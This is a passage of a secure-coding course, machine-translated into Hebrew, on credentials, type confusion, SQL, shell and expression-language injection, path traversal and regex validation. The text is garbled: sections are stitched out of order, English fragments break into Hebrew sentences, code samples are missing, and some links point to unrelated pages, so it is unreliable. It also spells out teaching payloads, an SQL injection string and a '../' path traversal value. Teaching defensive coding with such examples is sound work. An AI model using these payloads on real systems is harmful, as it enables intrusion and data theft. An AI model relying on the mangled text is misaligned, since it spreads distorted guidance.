ידוע* כדי להחיל על חשבון זה (ממסד הנתונים) יש להשתמש, כי באופן כללי אנו מעדיפים להשתמש (יותר) נתונים מהימנים.*איפוס סיסמה באמצעות דוא"ל בלבד אינו מנגנון אימות חזק מלכתחילה. אבל זה נסיבות נפוצות מספיק, וזה שימושי כדוגמה פשוטה.*\[הסבר]*הימנע מאישורי ברירת מחדל ואישורים מקודדים באופן קשיח*תוכניות רבות צריכות להשתמש במידע סודי. סוג נפוץ במיוחד של סוד הוא *אישור

####  (לדוגמה, סיסמה או מפתח סודי).  אופן ההגנה עליהם תלוי באופן השימוש בהם, וקיימים שני שימושים נפוצים עבור אישורים:

נכנסים**התוכנה מקבלת כמה אישורים כקלט ובודקת אם הם תואמים לאימות משהו אחר.**יוצאת

*   התוכנה שולחת את האישורים למשהו אחר כדי לאמת את עצמה למשהו אחר.

*   הימנע מאישורי ברירת מחדל*לעולם אין לספק תוכנה עם אישורי ברירת מחדל. ישנם דפי אינטרנט אינסופיים שעוקבים אחר אישורי ברירת מחדל כמו *מנהל/מנהל מערכת

*   . ברגע שמישהו ימצא את האישורים, סביר להניח שהם יגיעו בסופו של דבר לרישומים אלה. פעולה זו תאפשר לתוקפים לפרוץ לתוכנה שלך (אם מדובר באישור נכנס) או לתוכנה של אחרים (אם מדובר באישור יוצא). אם התוכנה כוללת התקנות רבות, ייתכן שכולם פגיעים בו זמנית. 

נזכר:

 משתמשים בדרך כלל מקבלים את ברירת המחדל, ואם ברירת המחדל אינה מאובטחת, התוכנה תהיה לא מאובטחת. ערפול הקוד אינו מספיק; תוקפים רבים מיומנים למדי בחילוץ וניתוח של קבצי הפעלה.*הפתרון הרגיל לכך הוא לקבל מצב "כניסה ראשונה" שמזהה שאין עדיין אישור (סיסמה או מפתח), ולאחר מכן מאפשר למשתמש ליצור אחד ייחודי. זאת בהנחה שיש לאחסן אותו בכלל; במקרים מסוימים, אתה יכול פשוט לבקש מהמשתמש לספק אותו בכל פעם.*הימנע מאישורים מקודדים באופן קשיח, אחסן אותם בבטחה במקום זאת

אישורים מקודדים באופן קשיח הם אישורים המאוחסנים בתוך קוד המקור, קוד שעבר הידור או כל מיקום אחר שמישהו המורשה לעשות זאת אינו יכול לשנות במהירות.*אישורים מקודדים באופן קשיח הם טעויות. יש לשנות את האישורים בכל פעם שהתוכנה מותקנת לראשונה לשימוש, ויש לשנותה בקלות ובמהירות. אחסון אישורים בקוד מקור הוא רעיון גרוע במיוחד. קוד המקור מנוהל בדרך כלל על ידי מערכות בקרת גרסאות, כך שכל האישורים בקוד יהיו זמינים לכל מי שיש לו גישה לקוד מקור זה ... וזה לעתים קרובות הרבה יותר אנשים ממה שצריך לדעת. קידוד מידע זה באופן שניתן לבטל (לדוגמה, באמצעות Base64 או ROT13) אינו עוזר.*לכן: אל תקודד אישורים (למשל, בתוך קוד מקור או קוד שעבר הידור). במקום זאת, אחסן אישורים בנפרד באופן שיקל על שינוים. אישורי מפתח ציבורי בדרך כלל אינם צריכים להישמר בסוד, אך ייתכן שיהיה צורך לעדכן אותם. אישורים אחרים צריכים לעתים קרובות להישמר בסוד, ויש להגן עליהם לפחות במידת הצורך. כפי שנדון בקצרה בהמשך, ישנם כלים שעשויים לעזור לך לזהות אישורים מקודדים באופן קשיח בקוד המקור.

עבור אימות נכנס באמצעות סיסמאות, אחסן אישורים בנפרד והשתמש באלגוריתם מאובטח שתוכנן במיוחד לקידודם. נדון בכך ביתר פירוט בהמשך הקטע על קריפטוגרפיה, אך לעת עתה, רק דעו שעליכם להשתמש ב *גיבוב קריפטוגרפי מלוח לכל משתמש* אלגוריתם כגון Argon2id.

#### עבור אימות יוצא, יש לאחסן אישורים מחוץ לקוד במערכת אחסון המוגנת מפני כל הזרים (כולל משתמשים מקומיים באותה מערכת/מארח ענן). באופן אידיאלי, כל האישורים יאוחסנו בקובץ או מסד נתונים מוצפן, אך בסביבות רבות, קשה לעשות זאת (היכן מאחסנים את המפתח כדי לגשת למפתח?). לכל הפחות, אחסן אישורים במשהו כמו טבלת קבצים או מסד נתונים עם הרשאות שהן מגבילות ככל שתוכל ליצור אותן באופן מעשי. משתני סביבה הם בדרך כלל דרך חלשה יותר לאחסן אישורים, מכיוון שהערכים שלהם זמינים לכל התהליך שטוען אותם, אך בנסיבות מסוימות זה מקובל... וזה בדרך כלל הרבה יותר טוב מאשר אישורי קידוד קשה.

🔔 אישורים מקודדים באופן קשיח הם סיבה נפוצה כל כך לפגיעויות אבטחה שהם 2021 CWE Top 25 #16 ו- 2019 CWE Top 25 #19. חולשה זו היא 

CWE-798*, *שימוש באישורים המקודדים באופן קשיח

. הקשורים 

אישורים לא מוגנים מספיק

*    הוא 2021 CWE טופ 25 #21 ו-2019 CWE טופ 25 #27 בתור <br>CWE-522

*   .<br>חידון 2.2: הימנע מאישורי ברירת מחדל וקידוד קשיח

*   \>>מפתחות סודיים צריכים להיות מאוחסנים בקוד מקור כך שלא ניתן יהיה לקרוא אותם בקלות, כפי שהם יכולים להיות אם הם מאוחסנים בקבצים נפרדים. אמת או שקר? <<<br>( ) נכון

*   (x) לא נכון<br>\[הסבר]

לא, להפך. אל תאחסן מפתחות סודיים בקוד מקור! קוד המקור משותף לעתים קרובות עם רבים אחרים, ומאוחסן במערכות בקרת גרסאות (מה שהופך אותו לנגיש יותר לאחרים). סיבה נוספת לאחסן מפתחות סודיים בנפרד היא כדי שניתן יהיה לשנות אותם בקלות. אם תוקף קורא את המפתחות הסודיים, פשוט שנה את המפתחות.*\[הסבר]*הימנע מהמרה או הטלת שגויים*כמעט כל שפות התיכנות תומכות בסוגי נתונים מרובים, כגון מספרים שלמים, נקודה צפה, תווים ומחרוזות. ברוב שפות התכנות יש לפחות בדיקת סוג כלשהי המובנית בהן; ניתן לבדוק סוגים באופן סטטי (לפני זמן ריצה) ו/או באופן דינמי (בזמן ריצה). בדיקות אלה יכולות לעתים להזהיר, או לנטרל, בעיות חמורות.*לפעמים יש צורך להמיר או להטיל ערך נתונים מסוג אחד למשנהו. הפרטים תלויים בשפת התכנות, אך בעוד שזה הכרחי, המרות שגויות והטלות בסופו של דבר גורמות למספר לא פרופורציונלי של פגיעויות. ההמרה עלולה לאבד מידע, או להוביל לערך חדש שעשוי היה להיות בלתי צפוי לחלוטין. כל המרה או ליהוק, במיוחד כזה שעלול לאבד מידע, צריך להיבדק כדי לשקול אם יש סיכון לעשות את זה. לשפות מסוימות יש 

#### קונסט

* זכאי להכרזה על קבועים; מסוכן להשליך *קונסט* מזהה, מכיוון שהדבר מאפשר שינויים בערך בעוד שחלקים אחרים של המערכת עשויים להיות תלויים בכך שהוא קבוע.*מקרה מיוחד, אשר יכול לקרות בכמה שפות תכנות, נקרא "בלבול סוג". בלבול סוגים מתרחש כאשר הגישה למשאב מתרחשת באמצעות סוג שאינו תואם לסוג המקורי שלו. זה יכול להיחשב המרה שגויה שקטה. ניתן לעשות זאת בקלות בשפות כמו C ו- C++ באמצעות סוגי איחוד, שבהם ניתן להגדיר במפורש את אותו אזור זיכרון כמאפשר סוגים מרובים. בעת שימוש בסוגי איחוד, על היזם לוודא כי רק הסוג הנכון משמש לגישה נתונה (קריאה או כתיבה).

עם זאת, בלבול הסוגים אינו מוגבל ל- C ול- C++ . בלבול הקלדה יכול להתרחש בכל שפה שבה ניתן לפרש את אותו משתנה או מיקום זיכרון ביותר מדרך אחת. כפי שצוין על ידי MITRE עבור **CWE-843**, "ניתן להפעיל שגיאות ביישומי PHP על ידי מתן פרמטרי מערך כאשר צפויים סקלרים, או להיפך., שפות כמו Perl, שמבצעות המרה אוטומטית של משתנה מסוג אחד כאשר ניגשים אליו כאילו היה סוג אחר, יכולות להכיל גם הן את הבעיות הללו".**לענייננו, המרות אינן כוללות קביעה אם ערך הוא אמת. באופן כללי, לשפות תכנות יש מבנים מותנים (כגון **אם

 ו 

*   בזמן<br>) שיפיקו תוצאות שונות בהתאם לשאלה אם הערך של תנאי הוא אמת או לא. מה שנכון הוא החלטה עיצובית מרכזית בעת יצירת שפת תכנות. לדוגמה, כל ערך ב- JavaScript נחשב לאמת למעט רשימה ספציפית של ערכים מזויפים (כרגע 

*   לא נכון<br>, 

*   0<br>, 

*   \-0<br>, 

0n

#### , 

""

, 

אֶפֶס

, 

מוגדר*ו *נאן

). בשפות כאלה, 

### אם פ

 ודומים הם קיצור דרך לבדיקה אם ערך הוא אמת. פרשנות זו בתנאים עשויה להיחשב כהמרה מסוג אחר לסוג בוליאני, אך מבנים כאלה הם למעשה רק דרך מקוצרת לקבוע אם ערך הוא אמיתי, וזה לא מה שאנחנו עוסקים בו כאן.

*   🔔 

*   Check if it is within the minimum and maximum lengths, if there are minimum and maximum lengths. Many systems will want to have a maximum simply to prevent attackers from sending absurdly-large amounts of data.

In some cases it may be very difficult to check much more. Personal names, in particular, are challenging, especially if you must deal with names in all locales. Many locales have conventions that are different from other locales; for example, is the given name or the surname (e.g., family name) listed first? There may not even be a surname or a given name. Names may contain spaces (even within a given name or surname), and, of course, there is no guarantee that the name uses only Latin or Chinese characters. For a discussion of the challenges, see the [*Falsehoods Programmers Believe About Names – With Examples*](https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/) article by Tony Rogers (2018).

עיקרון שימושי הוא רק לקרוא לשגרה עם ערכים חוקיים. אם שגרה דורשת שהמספר יהיה 0 עד 9, אז זה לא צריך להיות אפשרי עבור תוקף לגרום 50 להישלח. זה קל יותר בתיאוריה מאשר בפועל, במיוחד מאז גבולות אלה לא תמיד מתועדים היטב. אבל כאשר אתה יודע על מגבלה, שקול לבצע כמה בדיקות כדי לוודא שהן מכובדות, או כתוב את התוכנית שלך כך שהמגבלות יכובדו בהכרח.

עיקרון חשוב מאוד הוא שאם קשה להשתמש בשגרה בצורה מאובטחת, ויש דרך אחרת לבצע את המשימה שקל יותר לבצע בצורה מאובטחת, 

השתמש בשגרה שקל יותר להשתמש בה באופן מאובטח*. הנה כמה סימני אזהרה לכך שאתה משתמש בשגרה שקשה להשתמש בה באופן מאובטח:*הוא מבצע כל תוכנית שנשלחת אליו, וחלק מהנתונים שאתה שולח עשויים להגיע מתוקף. כל שגרה עם שם כמו 

### eval()

, 

exec()

, *לבצע()*או 

מערכת()

 יש סיכוי גבוה להיות בקטגוריה זו. לדוגמה, אל תשתמש 

eval()** ב- JavaScript לעיבוד נתוני JSON (באופן כללי!); השתמש במשהו בטוח יותר כמו הפונקציה של JavaScript **JSON.parse()**.**הוא דורש ממך לשרשר מחרוזות קבועות עם נתונים שעשויים להגיע מהתוקף. באופן כללי, יש לברוח מנתונים אחרים מהתקפה, וקל לטעות כאשר בורחים מנתונים.

תבנית הקלט שלו מתוארת באמצעות מפרט שפה (כגון טופס Backus-Naur).**הוא נועד לאינטראקציה אנושית ישירה, לא לתוכנית שתפעיל אותו.**אתה **יכול** להשתמש בשגרה כזו בצורה מאובטחת, ולפעמים אתה צריך. אבל אם אתה יכול להימנע מכך, התוכנית שלך כנראה תהיה מאובטחת יותר - וכנראה שיהיה קל יותר לתחזק אותה. אם אינך יכול להימנע מהם, ייתכן שתרצה לעטוף את השימוש בהם בעטיפות מיוחדות כדי להקל על השימוש בהם בבטחה.**מדוע קשה להשתמש בסוגים מסוימים של שגרות בצורה מאובטחת? אחת הבעיות הנפוצות היא שרוטינות רבות מקבלות שפות עם **מטא-תווים** - כלומר, תווים שמשנים את האופן שבו תווים אחרים מתפרשים במקום להיות נתונים עצמם. לדוגמה, תו המרכאות הכפולות (**"

) הוא לעתים קרובות מטא-דמות (כולל ב-SQL ובמעטפת). אם יש מפרט שפה, זה כמעט בוודאות אומר שיש מטא-דמויות. תמיכה במטא-תווים היא גמישה מאוד, ואם כל הקלט מהימן, זו לא בעיה. אבל כאשר חלקים מהנתונים עשויים להיות מתוקף, עליך להיות זהיר מאוד ולנקוט אמצעי זהירות נוספים. אם תוקף יכול להכניס מטא-תווים לתוך הקלט, והם לא נמלטים בדיוק כראוי, אז פגיעויות מסוכנות ומנוצלות בקלות לעתים קרובות לבוא אם הם נקראים על ידי איזה מתורגמן. התקפות מסוג זה נקראות לעיתים התקפות הזרקה.**🔔 פגיעויות להתקפות הזרקה הן טעויות נפוצות כל כך ביישומי אינטרנט כי "הזרקה" היא 2017 OWASP Top 10 #1 ו 2021 OWASP Top 10 #3. 2021 CWE Top 25 #28 ו-2019 CWE Top 25 #18 מזוהים **CWE-94**, **שליטה לא נכונה ביצירת קוד ('הזרקת קוד')**. 2021 CWE טופ 10 #25 הוא **CWE-77

, **נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודה ('הזרקת פקודה')**. גם CWE-94 וגם CWE-77 הם מקרים מיוחדים של **CWE-74**. **נטרול לא תקין של אלמנטים מיוחדים בפלט המשמש רכיב במורד הזרם ('הזרקה')**. לקטגוריה הכללית CWE-74 יש מקרים מיוחדים נפוצים אחרים כגון פגיעויות הזרקת SQL (**CWE-89**) והזרקת פקודות מערכת ההפעלה (**CWE-78**) שנדון בהם בקרוב.**אז אתה צריך להבטיח שכאשר אתה שולח נתונים לתוכנית כלשהי (או פלט), אתה שולח אותם בצורה מאובטחת. זה עשוי לכלול:**חיטוי**הסרת תו לא חוקי או זדוני (בדרך כלל מטא-תווים) מהנתונים.**לברוח**שינוי תווים (חלק מהמטא-תווים) כך שלא יתפרשו באופן שגוי.**נרמול**שינוי צורת הנתונים כך שתהיה טופס נפוץ (וכתופעת לוואי, מניעת גרימת בעיית אבטחה).**במידת האפשר, השתמש בספריות ובממשקי API שעושים זאת עבורך; קל יותר להשתמש בהם בצורה מאובטחת.**כעת נבחן כמה מקרי התקף הזרקה נפוצים וכיצד לטפל בהם בצורה מאובטחת. שוב, פגיעות בהזרקה היא כאשר תוכנית מקבלת נתונים מתוקף ומעבירה נתונים אלה באופן לא תקין למתורגמן פקודות כלשהו. חלק מהבעיות הנפוצות ביותר מתרחשות כאשר נתונים אלה נשלחים למערכת מסד נתונים (התקפות הזרקת SQL) או למפרש פקודות של מערכת ההפעלה (התקפות הזרקת פקודות של מערכת ההפעלה), ולכן נתמקד בהן. ברגע שתבינו כיצד להתמודד עם שני המקרים הנפוצים הללו, יהיה הרבה יותר ברור כיצד לטפל כראוי במתורגמנים אחרים שלא נסקור כאן (למשל, פרוטוקול הגישה לספריות קל משקל (LDAP)). נתחיל בדיון בשליחת נתונים למערכות מסדי נתונים, שלעתים קרובות פגיעות להתקפות הזרקת SQL.**חידון 3.1: מבוא לתוכניות שיחות מאובטחות - היסודות

\>>פשוט בחר תוכנה מאובטחת לשימוש חוזר, והיישום שלך יהיה מאובטח. אמת או שקר? <<*( ) נכון*(x) לא נכון*\[הסבר]*זה לא נכון. ברור, אם אתה בוחר ידוע **ביטחון** תוכנה, תהיה לך בעיה. בנוסף, עליך להעדיף תוכנה קלה יותר לשימוש מאובטח. אבל באופן כללי, אתה צריך **שימוש** תוכנה שנעשה בה שימוש חוזר בצורה מאובטחת - לא רק לבחור רכיבים מאובטחים.**\[הסבר]**קריאה לתוכניות אחרות: הזרקה ושמות קבצים**הזרקת SQL**פגיעות בהזרקת SQL

מעלליה של אמא**אוחזר מתוך, **xkcd.com*רשיון תחת, *CC-BY-NC-2.5**רוב מערכות מסדי הנתונים כוללות שפה שיכולה לאפשר לך ליצור שאילתות שרירותיות, ובדרך כלל גם פונקציות רבות אחרות (למשל, יצירה ושינוי של דברים). שפת SQL נפוצה במיוחד, ובעוד שמערכות מסדי נתונים מסוימות משתמשות בשפות אחרות, לשפות אחרות אלה יש לעתים קרובות קווי דמיון עם SQL. שפות כאלה, כולל SQL, כוללות מטא-תווים. כאשר תוקפים יכולים להוסיף מטה-תווים לפקודת SQL כדי לגרום לבעיית אבטחה, ההתקפה נקראת **התקפת הזרקת SQL**והפגיעות נקראת, **פגיעות הזרקת SQL**. הזרקת SQL לפעמים מקוצרת כ- SQLi.**גם אם שפת מסד הנתונים אינה SQL, אם מדובר בהתקפה על שפה עבור מערכת מסד נתונים היא נקראת לעתים קרובות התקפת הזרקת SQL (למרות שטכנית זה לא מדויק). אנו נתמקד ב- SQL, מכיוון ש- SQL נפוץ מאוד וברגע שאתה מבין כיצד להתמודד עם התקפות הזרקת SQL, קל להכליל זאת לכל שפת מסד נתונים.**הנה דוגמה טריוויאלית; הנה קטע של Java שמנסה לבצע שאילתת SQL, אך עושה זאת בצורה לא מאובטחת:**הכוונה ברורה; אם **search_lastname** יש את הערך **פרד**ואז מסד הנתונים יקבל את השאילתה ",**בחר \* מתוך מחברים שבהם שם משפחה = 'פרד';**" - שאילתת SQL סבירה. אבל זכרו את סימני האזהרה שלנו - הקוד הזה משרשר מחרוזות, חלק מהנתונים האלה כנראה מסופקים על ידי תוקף, ואנחנו עושים משהו שנקרא "ביצוע".  סימני האזהרה נכונים. תארו לעצמכם שהתוקף מספק את הקלט "**פרד' או 'a'='a**". פעולה זו תיצור את השאילתה "**בחר \* מתוך מחברים שבהם שם משפחה = 'פרד' או 'a'='a';**" ועכשיו התוקף יכול לאחזר את מסד הנתונים כולו. התוקף יכול אפילו לשנות או למחוק נתונים בדרך זו, בהתאם לגורמים שונים. זוהי דוגמה פשוטה להתקפת הזרקת SQL; תוקף יכול להוסיף תווים מסוימים ולהזריק פקודות חדשות או פקודות שהשתנו.*ישנן דרכים רבות להפעיל התקפות הזרקת SQL; תוקפים יכולים להוסיף ציטוטים בודדים (המשמשים להקפת נתוני תווים קבועים), נקודה-פסיק (המשמשים כמפרידי פקודות), "*--**" שהוא אסימון תגובה, וכן הלאה. זו אינה רשימה מלאה; מערכות מסדי נתונים שונות מפרשות תווים שונים באופן שונה. לדוגמה, מרכאות כפולות הן לעתים קרובות metacharacters, אבל עם משמעויות שונות. אפילו גרסאות שונות של **זהה* מערכת מסד נתונים, או תצורות שונות, יכולות לגרום לשינויים באופן הפרשנות של התווים. אנחנו כבר יודעים שאנחנו לא צריכים ליצור רשימה של תווים "רעים", כי זה מכחיש. אנחנו יכולים ליצור רשימת היתרים של תווים שאנחנו יודעים שהם לא מטא-תווים ואז לברוח מהשאר, אבל קשה לעשות את התהליך הזה בצורה נכונה עבור SQL.*אל תשרשר מחרוזות כדי ליצור שאילתת DBMS, מכיוון שהיא אינה מאובטחת כברירת מחדל. זה כולל שימוש במחרוזות תבנית, אינטרפולציות של מחרוזות, תבניות מחרוזות וכל המנגנונים האחרים שפשוט משרשרים טקסט. לדוגמה, אותן פגיעויות מתרחשות אם אתה משתמש במילולי מחרוזת המעוצבים על-ידי Python (מחרוזות f כגון **f'{year}-{month}'**), פייתון'ס ** שיטה, מחרוזות התבנית של JavaScript (**”, followed by 0 or more instances of the sequence “**abc**אם עליך להתקשר לתוכנית באמצעות מעטפת, ולכלול גם נתונים מסוימים שעשויים להיות מסופקים על-ידי תוקף, עליך להשתמש בה באופן מאובטח. זה בעצם די מסובך. כמו תמיד, **אל תשתמש ברשימת הכחשה**. יש הרבה "רשימות של מטא-דמויות פגז" שהן שגויות כי הן מפספסות כמה. אז אם אתה שולח נתונים דרך פגז, אתה צריך לברוח מכל תו למעט אלה ברשימת ההיתרים (תווים שאתה יודע שהם 

לא** מטא-דמויות). בדרך כלל, A-Z, a-z, ו- 0-9 אינם metacharacters, ולאחר מכן, לבדוק בזהירות רבה. הקפד לצטט הכל לפי הצורך.**כמובן, אם אתה מתקשר לתוכנית עם נתונים כלשהם שעשויים להיות מתוקף, עליך לוודא שהנתונים לא יתפרשו באופן שגוי. לדוגמה, ודא שאפשרויות שורת הפקודה שלך יפורשו כהלכה; אם תוקף יכול לגרום לתו הראשוני להיות "**-**" או "*/*" בפרמטר, אז הם עשויים להתפרש בטעות כאופציה או כספריית שורש. יש לחמוק בזהירות מכל דבר שעובר פנימה (למשל, לפי פרמטר או כל דבר אחר) כדי למנוע התקפה. זה מביא אותנו לנושא של שמות קבצים, אשר נסקור הבא.

🔔 הזרקת פקודות מערכת ההפעלה היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2019 CWE Top 25 #11 ו- 2021 CWE Top 25 #5. זה [*CWE-78*](https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/), [נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודת מערכת הפעלה ('הזרקת פקודות מערכת הפעלה')](https://refrf.shreyasminocha.me/).

### חידון 3.3: הזרקת פקודת מערכת ההפעלה (פגז)

\>>הימנע מלקרוא שלא לצורך למעטפת מערכת הפעלה כאשר אתה פשוט רוצה להפעיל תוכנית אחרת. אמת או שקר? <<

(x) נכון*( ) לא נכון*\[הסבר]

#### זה נכון. לא רק שזה יעיל יותר, אבל פגז מערכת ההפעלה בדרך כלל מגיב למספר רב של תווים מיוחדים כי תצטרך להתמודד עם כדי להשתמש בו בצורה מאובטחת. אם אינך זקוק לפונקציות הנוספות שלו, אין טעם להתקשר דרכו. כמובן, ייתכנו מקרים שבהם היכולות הנוספות שלה הן בעלות ערך עבורך; במקרים אלה, יהיה עליך להיות זהיר מאוד ולברוח ממטא-תווים כדי להבטיח שהנתונים לא יתפרשו באופן שגוי.

\[הסבר]*התקפי הזרקה אחרים*ישנם סוגים רבים אחרים של התקפות הזרקה מעבר להזרקת SQL והזרקת פקודות של מערכת ההפעלה. ייתכן שקיים סיכון להתקפת הזרקה בכל פעם שאתה שולח נתונים הנשלטים חלקית על ידי משתמש לא מהימן בפורמט בעל מטא-תווים, מוגדר כשפה ו/או מעובד על ידי מתורגמן.*דוגמאות שבהן עלול להיות סיכון לפגיעות בהזרקה כוללות יצירה ושליחה של פקודות JSON, yaml, XML, פרוטוקול גישה לספריות קל משקל (LDAP) ותבניות רבות אחרות לספריות, מסגרות ורכיבים אחרים שאתה תלוי בהם, וכן פלט שלהם למשתמשים בסופו של דבר. בכל המקרים, פתרון אחד הוא להשתמש ב- API שבורח באופן אוטומטי מהטקסט לפי הצורך, בדיוק כמו שימוש במשפטים עם פרמטרים בעת יצירת SQL.*וריאציה מעניינת אחת של התקף הזרקה מתרחשת כאשר ביטוי כלשהו מבוצע פעמיים שלא במתכוון. זה יכול להתרחש, למשל, בשימושים מסוימים של שפת הביטוי במסגרת Java האביב הנפוץ, שם ההתקפה נקראת הזרקת שפת ביטוי. פגיעות זו נפוצה להפליא, ולכן נסביר אותה בהמשך כאן.*"שפת ביטוי" (EL) פותחה כחלק מספריית התגים הסטנדרטית של Java Server Pages (JSTL) כדי להקל על קבלת נתונים ממודל האובייקטים הבסיסי. לדוגמה, זה:*הוא קיצור נוח עבור:

הבעיה היא שבמקרים מסוימים ניתן לפרש את ה-EL פעמיים בעת שימוש ב-Spring בהינתן גרסאות ותצורות מסוימות. לדוגמה, התגים * ו * עשוי לפרש פעמיים את התכונות הבאות: *, *, **, **, **ו **. לדוגמה נוספת, ** ו ** עשוי לפרש פעמיים את התכונה **. כאשר זה קורה, כפי שצוין ב "**קוד מרחוק עם הזרקת שפת הבעה*" מאת Amodio (2012), הוא כי בקשה של הטופס:*לדף המכיל:**יכול לגרום לפלט המכיל מידע פנימי על השרת, כולל Classpath וספריות עבודה מקומיות.**השאלה אם הבעיה מתרחשת או לא תלויה בגרסת Spring, בגורם המכיל של Java Server Pages /Servlet (אם קיים) ובכמה אפשרויות תצורה. לקבלת מידע נוסף, ראה "**הזרקת שפת הבעה**" מאת די פאולה ודבירסיאגי (2011) ו"\[**קוד מרחוק עם הזרקת שפת הבעה**" מאת אמודיו (2012).**ברור שחשוב לוודא שביטויים מוערכים רק כמה פעמים כצפוי (בדרך כלל פעם אחת). זה חכם לוודא שהתצורה עושה זאת, אם יש חלופה אפשרית. אם יש חששות כלשהם, כלול בדיקות בחבילת הבדיקות האוטומטית שלך כדי לוודא שביטויים מוערכים פעם אחת בלבד בהקשרים בטוחים, כך שכל טעות עתידית תזוהה מיד לפני השימוש בייצור. במקרה של אביב, בדיקה יכולה לספק נתונים כמו ** במבנה מסוכן ולאחר מכן לוודא שטקסט התגובה היה המצופה (ולא *).*🔔 2021 CWE טופ 25 #30 הוא 

**CWE-917**

, *נטרול לא תקין של אלמנטים מיוחדים המשמשים במשפט שפת ביטוי ('הזרקת שפת ביטוי')*.**שמות קבצים (כולל מעבר נתיב וקישור הבא)**מבחינה טכנית, "**שם נתיב**" הוא רצף של בתים המתאר כיצד למצוא אובייקט מערכת קבצים. במערכות דמויות יוניקס, כולל לינוקס, אנדרואיד, MacOS ו- iOS, שם נתיב הוא רצף של שם קובץ אחד או יותר המופרדים על ידי אחד או יותר "**/**". במערכות Windows, שם נתיב מסובך יותר אך הרעיון זהה. בפועל, אנשים רבים משתמשים במונח "שם קובץ" כדי להתייחס לשמות נתיבים.**שמות נתיבים נשלטים לעתים קרובות, לפחות באופן חלקי, על-ידי משתמש לא מהימן. לדוגמה, לעתים קרובות שימושי להשתמש בשמות קבצים כמפתח לזיהוי נתונים רלוונטיים, אך הדבר עלול להוביל לכך שמשתמשים לא מהימנים ישלטו בשמות קבצים. דוגמה נוספת היא בעת ניטור או ניהול של מערכות משותפות (למשל, מכונות וירטואליות או מערכות קבצים מכולות); במקרה זה, מפקח לא מהימן שולט בשמות קבצים. גם כאשר תוקף לא אמור להיות מסוגל להשיג סוג כזה של שליטה, לעתים קרובות חשוב להתמודד עם סוג זה של בעיה כאמצעי הגנה לעומק, כדי להתמודד עם תוקפים שמקבלים כמות קטנה של שליטה.**חציית נתיב*מקרה ברור הוא שלעתים קרובות מערכות אינן אמורות לאפשר גישה מחוץ לספרייה כלשהי (למשל, "שורש מסמך" של שרת אינטרנט). לדוגמה, אם תוכנית מנסה לגשת לנתיב שהוא שרשור של "*trusted_root_path**" ו "**שם משתמש*", ייתכן שהתוקף יוכל ליצור שם משתמש ".*./.. /.. /mysecrets

**" ולסכל את המגבלות. פגיעות זו, שבה תוקף יכול ליצור שמות קבצים החוצים מחוץ למקום שבו הוא אמור להיות, היא כה נפוצה עד שיש לה שם: **

פגיעויות חציית ספריות**. כמו תמיד, השתמש ברשימת היתרים מוגבלת מאוד לקבלת מידע שישמש ליצירת שמות קבצים. אם רשימת ההיתרים של יישום האינטרנט שלך אינה כוללת "**.*", "*/*", "*~*", ו "*\\**", ברוב המערכות קשה יותר באופן משמעותי לחצות מחוץ לשורש הספרייה המיועד. פתרון נפוץ נוסף הוא להמיר נתיב יחסי לנתיב מוחלט מנורמל באופן שמבטל את כל "**..**" משתמש ולאחר מכן ודא שהנתיב המתקבל עדיין נמצא באזור הנכון של מערכת הקבצים.**😱 שעת סיפור: סולטסטאק**דוגמה לפגיעות של חציית ספריות היא **CVE-2020-11652

#### נקודת תורפה ב-SaltStack., SaltStack הוא כלי לניהול תצורה ותזמור לניהול תשתיות מרובות מחשבים. בפגיעות זו, שיטה נכשלה בחיטוי תקין של פרמטר קלט, מה שאפשר "

..

" רכיבים ששימשו ליצירת שם קובץ. התוצאה הייתה שהתוקפים יכלו לגרום לקבוצות שלמות של מכונות לבצע פקודות לפי בחירתם.

1.  🔔 חציית נתיב היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #8 ו- 2019 CWE Top 25 #10. הוא מזוהה גם כ <br>CWE-22**, **הגבלה לא נאותה של שם נתיב לספרייה מוגבלת ('חציית נתיב')**.**שמות נתיבים של חלונות

2.  שמות נתיבים של Microsoft Windows יכולים להיות קשים מאוד להתמודדות מאובטחת. פרשנויות שמות הנתיבים של Windows משתנות בהתאם לגירסת Windows ול- API שבו נעשה שימוש (שיחות רבות משתמשות <br>צור קובץ** התומך בקידומת שם הנתיב "**\\.\\*“one or more”*. This is often used in C programs. So for example, “**\[B-D]+**” means *“one or more of the letters B, C, or D”*.

3.  Perl Compatible Regular Expressions (PCRE)<br>This is mostly an extension of the ERE format; many other programming languages use this family of regex languages. It includes capabilities like “**\d**” to represent digits.

Here are some important things that vary:

*   Sometimes there is an option or alternative method to match the entire input; if available, you can use that instead of the anchoring symbols. Make sure it matches the whole thing, though; some methods only check the beginning.

*   Sometimes “**^**” matches the beginning of the whole data, while in others it represents the beginning of any line in the data. The same goes for “**$**”. This is often controlled by a *multiline* option.

*   The “**.**” for representing *“any character”* doesn’t always match the newline character (**\n**); often there is an option to turn this on or off.

*   Does it properly support Unicode and the encoding you are using?

*   Can it handle data with the **NUL** character (byte value 0) within the data? If not, and your input data could have an embedded **NUL** character, you will need to validate the data first to make sure there are no **NUL** characters before passing the data to the regex implementation.

*   Is matching case-sensitive? Usually it is case-sensitive by default, and there is a trivial way to make it case-insensitive. If it is case-insensitive, remember that exactly what characters have case-insensitive matches depends on the locale. For example, “**I**” and “**i**” match in the English (“**en**”) and the C locale (“**C**”), but not in the Turkish (“**tr**”). In the Turkish locale, the Unicode LATIN CAPITAL LETTER I matches the LATIN SMALL LETTER DOTLESS I - not a lowercase “**i**”.

In some languages, such as in Ruby, you normally use **\A** and **\z** instead of “**^**” and “**$**” to match string begin/end, because “**^**” and “**$**” match line begin/end instead.

#### Branch Priority

Almost all regex implementations support *branches* - that is, “**aa|bb|cc**” matches **aa**, **bb**, or **cc**. All ERE and PCRE implementations support branches, and even some BRE implementations support branches if they are written as “**\\|**” instead of “**|**”. The *priority* of the branch operation is standard, but it is not what some users expect. The regex “**^aa|bb$**” means *“either it begins with aa OR it ends with bb”*, not *“exactly aa or bb”*.  When you are using regexes for input validation, a sequence of branches that is not surrounded by parentheses is practically always a mistake. What you normally want is “**^(aa|bb)$**” which means *“exactly aa or bb”*.

**🚩 So, whenever you have a branch (“|”) in a regex, group the whole expression with branches using parentheses.**

#### Test Input Validators

Again, you should know what your software should not accept, and use some of those examples as automated test cases to ensure that your software will correctly reject them. This is especially important with regexes, because it is easy to write a regex that looks fine but allows inputs it wasn’t intended to. This can help you catch, for example, missing anchors or failures to surround branches with parentheses.

